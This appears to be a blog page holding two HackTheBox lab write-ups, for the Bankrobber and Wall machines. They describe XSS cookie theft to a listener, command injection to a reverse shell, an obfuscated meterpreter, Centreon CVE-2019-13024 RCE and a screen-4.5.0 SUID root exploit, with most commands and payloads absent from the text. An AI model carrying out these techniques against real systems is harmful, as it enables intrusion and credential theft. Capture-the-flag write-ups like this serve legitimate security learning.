Exploit Redis Server Article

Pentesting with Redis

Official Exploit of Webmin 1.910

How to get in into the machine with Redis Exploitation

entry.title: HackTheBox - Bankrobber
entry.content:
Quick Summary

‚Üí Insane machine ‚Äì Bankrobber is a Web Application that vulnerable to XSS, SQL Injection and RCE that I have to exploit to get the Admin credentials by using XSS.
SQL Injection to study how‚Äôs the backdoorchecker.php work, do command injection inside the machine from Web Application to get a reverse shell.
Inside the machine‚Äô I did portforwarding to test the E-Coin transfer‚Äô from there I managed to inject RCE and get the root.

Penetration Testing Methodologies

  1. Network Scanning

    ‚Üí Nmap scan

    ‚Üí discover open ports and what services are running

  2. Enumeration

    ‚Üí Browsing the HTTP Service

    ‚Üí MySQL and SMB open

    ‚Üí Bruteforce the Web page directories

  3. Post - Exploitation

    ‚Üí Create account and Login

    ‚Üí Transfer any amount of e-coin

    ‚Üí Do client side attack

    ‚Üí Use XSS to steal admin credentials

    ‚Üí Login as admin and find some interesting in the page

  4. Exploitation

    ‚Üí Found an XSS and SQL Injection vulnerabilites in search.php and backdoorchecker.php

    ‚Üí Upload a webshell to the server and get a reverse shell

  5. Privilege Escalation

    ‚Üí Use winPE. or Windows privilege escalation with cmd

    ‚Üí Looking at running process and active connections inside the machine

    ‚Üí Use obfuscated meterpreter and tunnel the network with Portforwarding

    ‚Üí Bruteforce the digit code and test the E-coin transfer

    ‚Üí Found RCE(Remote Code Execution) in E-coin transfer

    ‚Üí Gain the Administrator shell

Network Scanning

Walkthrough

‚Üí First, I run the Nmap to scan the target and get information about the various services that are running on the target machine. I use

  • -sV ‚áí Probe open ports to determine service/version info
  • -sC ‚áí equivalent to ‚Äîscript=default
  • -p- ‚áí Scan all 65535 ports
  • -oN ‚áí to save our scan results to a text file

Nmap results

Which found opened ports 80, 443, 445 and 3306

Enumeration

I visited the web page in port 80 and it‚Äôs present a Bitcoin web page with Login and Register form.

MySQL on port 3306

The MySQL port is open so I try to connect with it but it couldn‚Äôt

SMB on port 445

connecting to SMB is not helpful too.

Brutefore Web directories

I also run dirsearch Web path scanner to look if there‚Äôs any interesting web directories.

things that caught my attention is this web directories

Post - Exploitation

Create account and Login

To test‚Äô I created an account and login it too. Next,
I visited the /admin/index.php and says You're not authorized to view this page for me this is really weird, if you have experience in Web development you will notice that there was an misconfigured in this website.

Steal Admin creds via Cookies

Now I need to get the credentials of the admin. I try to look on the page source of the web page to look for hint but I did not see anything.
then I try the e-coin transfer in user page and this alert caught my attention.

It looks like the admin is checking each transfer transaction, so I intercept it with BurpSuite (A Web Penetration Testing tool)

Using this payload from PayloadAllTheThings

my user id # here is ID #4, my username and password in on base64 code format.
toId= is the id where I transfer my e-coin. I set first my nc listener on port 80 then I modify the response with my payload and send it.

after 5-10 minutes of waiting, I‚Äôll get a response in my nc listener and it‚Äôs the username and password of the admin in base64 code format.
Convert it to plaintext and I got now the admin creds.

Login as Admin

Now that I have the admin credentials, login as admin, and find some interesting capabilities.
and there‚Äôs a NOTES.TXT inside of the Admin page.

Looking at the notes.

I don‚Äôt know what that means, but there are two things that I‚Äôm sure of.
‚áí default Xampp installation folder is in the C:\xampp\htdocs\ where you can run a local web server.
‚áí There‚Äôs was a vulnerability in the encode comments. For every IP address.

Next, the two interesting things I found inside the admin page ‚Äì Search users and Backdoorchecker.
I try to search my ID # in search users (beta) when you say beta it‚Äôs not fully functional, there was an existing bugs and errors with that.

Backdoorchecker

‚áí Due to recent hacking attemps on the server, Backdoorcheker features is only accessible from the localhost because it returns the following message when I try any commands:

There‚Äôs a possibility that this features is vulnerable to SQLi.

Exploitation

XSS and SQL Injection

I try to intercept the search users function using BurpSuite and try SQL Injection.

term=4 is my user ID # then sending this to repeater, I put this sql syntax to check how‚Äôs backdoorchecker.php work.

and I got this response.

‚Äì sql injection

It returns to send the request from localhost and the first 3 characters must be ‚Äúdir‚Äù and you can use the characters $(" or '&'")

To execute code I use the PhantomJS bot (via XSS) to send a post request to backdoorchecker.php with a code execution bypass inside the parameter.
I ping my Kali linux machine and set tcpdump. I used:

and my Kali Linux get a response from Bankrobber

Get Reverse Shell

To exploit this vulnerabilities and get a reverse shell. I used Nishang - Offensive PowerShell for red team, penetration testing and offensive security. I use the script, Invoke-PowerShellTcp.ps1 and named it to evil.ps1.
I called it using powershell through an Impacket Samba Server and setup an nc listener to my Kali Linux.

after 5-10 minutes, my impacket-smbserver got a response and get in into the Bankrobber machine.

and finally I have now the user.txt

Privilege Escalation

Recon

Doing some Reconnaissance, I used winPE or Windows privilege escalation with cmd it‚Äôs a tool similar to LinEnum.

It can help with automating Penetration Tests. It performs a discovery on the environment it runs in and tries finding weaknesses to allow privilege escalation. Saving time and allowing more effort to be put toward getting root.

Process and Active Connections

running this takes time. after 10-15 minutes I‚Äôve got now the response.

System Info of Bankrobber

I see something‚Äôs odd running on port 910

And a suspicious running on the background process named ‚Äì bankv2.exe is the same PID #1632 in port 910

Customizing custom Meterpreter loader

so I tunnel my local port 910 in my Kali Linux system to the port 910 of the Bankrobber. To do so I created an obfuscated meterpreter.

see this:
https://astr0baby.wordpress.com/2013/10/17/customizing-custom-meterpreter-loader/

run the bash script and check the payload file

I uploaded it to the Bankrobber and execute it, then I setup a meterpreter session:

Metasploit meterpreter

Now that I have the meterpreter session next I did is Port forwarding

And connect it to the port using nc -vn 127.0.0.1 910 and it works! Next I try to input a digit code ‚Äì 1234 but it‚Äôs not working.

Brute force the digit code

Since I don‚Äôt know what is the exact digit code here, I decided to bruteforce it using bash command line even that I have a feeling that I could get blocked by doing this. so

After a seconds‚Äô I get now the right digit code ‚Äì 0021

When I log in with this PIN, I can transfer e-coins and I see that the transfer.exe process inside is executed:

‚áí [$] Executing e-coin transfer tool: C:\Users\admin\Documents\transfer.exe

Remote Code Execution (RCE)

Now, theres a possible RCE on that process.
I exploited the E-coin transfer by running my payload inside the Bankrobber machine‚Äô and create meterpreter sessions.
Instead of putting amount of E-Coins in e-coin transfer. I executed my payload with this line.

After executed it i got a response from my meterpreter sessions.

Administrator Shell

and Finally rooted !
‚áí nt authority\system

Get root.txt

If you liked my writeup please leave a respect on my Profile

Referrences:
Port 910

Port 910

Customize Meterpreter Payload

XSS with Phantom JS

entry.title: HackTheBox - Wall
entry.content:
Quick Summary

‚Üí Wall is my very first machine on HackTheBox that I hacked. It is running in Web Application that vulnerable to RCE(Remote Code Execution), a classification of security vulnerabilities. RCE enables a remote attacker to execute arbitrary code, bypassing security authorization, and by abusing this vulnerabilities I manage to get in into the machine. First I fall on to the rabbit hole which is the aa.php, and server-status page. The tricky part of this machine was finding the hidden page of the web application because it‚Äôs not something normally shows up in the wordlists. I use the Burp Suite and edit the Request fo find some interesting stuffs and then i found the right page of the webapps. The vulnerability inside is a SUID binary which users can get a full privileges.

Penetration Testing Methodologies

  1. Network Scanning

    ‚Üí Nmap scan

    ‚Üí discover open ports and what services are running

  2. Enumeration

    ‚Üí Browsing the HTTP Service

    ‚Üí Bruteforce the Web page directories

    ‚Üí Finding the hidden page

  3. Post - Exploitation

    ‚Üí Exploring the web page

    ‚Üí Bruteforce the credentials using the token

    ‚Üí Logging in as admin

  4. Exploitation

    ‚Üí Getting the Reverse shell using CVE-2019-13024.

    ‚Üí Find some interesting things

    ‚Üí Check Linux Binaries

  5. Privilege Escalation

    ‚Üí Exploit the unusual Linux binaries

    ‚Üí Execute the exploit

    ‚Üí Get the root shell and read the root and user file

Network Scanning

Walkthrough

‚Üí First, is to scan the target IP using Nmap to get information about the various services that are running on the target machine. We use

  • -sV ‚áí Probe open ports to determine service/version info
  • -sC ‚áí equivalent to ‚Äîscript=default
  • -A ‚áí Enable OS detection, version detection, script scanning, and traceroute
  • -oN ‚áí to save our scan results to a text file

Nmap results

Enumeration

By visiting the http page we got the default page of Apache Web Server

We try to explore the default page by inspecting the source code but I can‚Äôt find any interesting things there so I‚Äôll try to bruteforce the directories to look for hidden page. I use gobuster with medium.txt file. To save the outfile we use -o name of a file

After a minutes of bruteforcing I got the following directories.

Now let‚Äôs take a look with the following page I got. First the ‚Äúaa.php‚Äù
http://10.10.10.157/aa.php


No interesting things here.

So next the server-status page
http://10.10.10.157/server-status


And I got the Forbidden page.

Next the is the monitoring page
http://10.10.10.157/monitoring

And I got a pop-up login. This page is very interesting but I don‚Äôt have any credentials so i will leave this for a while and try to enumerate again the machine using Nikto - Web Server scanner.

Nikto results

Next is I will intercept this request with BurpSuite (A Web Penetration Testing tool) and send this to Repeater.

Repeater

Now we will change the request body method into ‚ÄúPOST‚Äù and let‚Äôs see what response we can get.

As you can see there‚Äôs a redirected page in URL='/centreon' so I try this on browser to find out what is this.

Centreon Login Page v. 19.04

Then a Centreon Login page with version 19.04. Centreon is an open source infrastructure monitoring software.
Based on some googling for default creds also in the documentation of the software, I tried all combinations of ‚Äúcentreon‚Äù, ‚Äúadmin‚Äù, and ‚Äúroot‚Äù, but didn‚Äôt get logged in.

Post - Exploitation

Finding Exploit

I try to explore the login page by viewing the page source code and try to look if there‚Äôs any interesting things.
I also google the version of the Centreon v19.04 and I found out that the version of this software is vulnerable to RCE(Remote Code Execution) attack.

Login page view page source

Brute Force the Credentials

By viewing the page source code, there‚Äôs a hidden value of Centreon CSRF token. After some research luckily I found this script on Github that can use to bruteforce the logins which are using anti-CSRF tokens to stop you from brute forcing them. I try to use this by the following commands based on the instructions of the script.

After a minute I get the ‚Äúpassword1‚Äù now try to use this password for login with default username ‚Äúadmin‚Äù ;) then I can now logged in !


Centreon Main Page

Exploitation

We know that the Centreon version on this machine was vulnerable to RCE(Remote Code Execution) attack. So I did search on Google to find an article about it and what I saw was article from creator (Askar) of this box.

Exploit Blog for Centreon

Centreon v19.04 Remote Code Execution. (CVE-2019-13024)

Centreon v19.04 Remote Code Execution (CVE-2019-13024) - Shells.Systems
Estimated Reading Time: 6 minutes Summary about Centreon Centreon is ‚Ä¶

The exploitation triggers by adding an arbitrary command in the nagios_bin parameter when setup a new configuration or update configuration for a poller.

Based on the blog we can set a payload in Monitoring Engine Binary.

I tried to use the exploit script but it‚Äôs not working, I didn‚Äôt get a reverse shell, my Ncat listener can‚Äôt get any response whenever I run the exploit even I modified it.
So i tried to encode my payload into base64 hoping that this one will work.

Now I will paste our base64 code payload into Monitoring Engine Binary.

In the exploit script i will paste my payload too in nagios_bin line. with echo${IFS}

After running the exploit with my Ncat listener, still didn‚Äôt work. So I tried to search again on Google to look for other exploit of Centreon RCE and i found this. Same procedure I will paste again my payload to nagios_bin line and next is run the exploit with my Ncat listener.

WWW-DATA SHELL -> shelby

Running this and we now get the www-data shell.

As you can see Bash‚Äôs job control is turned off. using this line we can enable bash command in the shell.

Now I can use commands like ‚Äúid‚Äù.

upgrade the shell with python

Privilege Escalation

Linux SUID Binaries

Now it‚Äôs time to find some interesting things in this machine that I can use for Privilege Escalation. First I look into Linux SUID binaries. and I spotted something odd, the screen with version 4-5.0 was the biggest hint for me.

Screen 4-5.0

If you are familiar with Linux SUID‚Äô you will notice that the ‚Äú/bin/screen-4.5.0‚Äù is not a normally or default Linux suid so this one is very interesting so trying to use Searchsploit if there‚Äôs an existing exploit in ‚Äúscreen-4.5.0‚Äù. And there is.

I read first the .txt file of the exploit to know on how can I use this for exploitation.

It check opens the logfile with full root privileges. This allows us to truncate any file or create a root-owned file with any contents in any directory and can be easily exploited to full root acces in several ways.

Base on the instructions of the exploit, I will try to create a file ‚Äúbla-bla‚Äù then use this commands ‚Äúls -la‚Äù

As you can see, the ‚Äúbla.bla‚Äù file is owned by root.

I will now use the exploit script we get on the searchsploit, but it didn‚Äôt work properly so I did it manually, first I compiled the binaries on my Kali machine:

libhax.c - code

rootshell.c - code

Now is to compile this two exploit.

After I compile the exploit i‚Äôll transfer it to the target. To transfer the file I set a local HTTP Server in my Kali machine.

to download it into Wall machine, we can use wget commands in the tmp directory.

Going to Root

Now i will go to the ‚Äú/etc/‚Äú directories in the target and do the exploit

Now going to ‚Äú/tmp/rootshell‚Äù

Now that I‚Äôm root, I can now grab both flags ‚Äì user.txt & root.txt :)

If you liked my writeup please leave a respect on my Profile
